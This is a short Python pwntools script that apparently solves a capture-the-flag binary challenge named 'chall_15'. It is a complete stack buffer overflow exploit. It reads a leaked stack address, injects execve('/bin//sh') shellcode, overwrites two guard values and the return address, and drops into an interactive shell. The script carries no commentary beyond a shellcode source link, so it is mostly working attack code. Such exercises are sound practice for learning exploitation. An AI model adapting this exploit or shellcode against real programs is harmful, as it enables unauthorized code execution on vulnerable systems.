#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall_15')

p = process(binary.path)

p.recvline()
_ = p.recvline().strip()
stack = int(_,16)
log.info('stack: ' + hex(stack))

# http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
shellcode += b'\x49\x89\xd2\x0f\x05'

payload = b''
stack += len(payload)
payload += shellcode
print(0x128 - len(payload))
payload += (0x128 - len(payload) - 0x10) * b'C'
payload += p32(0xDEADD00D)
payload += p32(0xB16B00B5)
payload += p64(stack)
payload += p64(stack)

p.sendline(payload)
p.interactive()
print(p.poll())

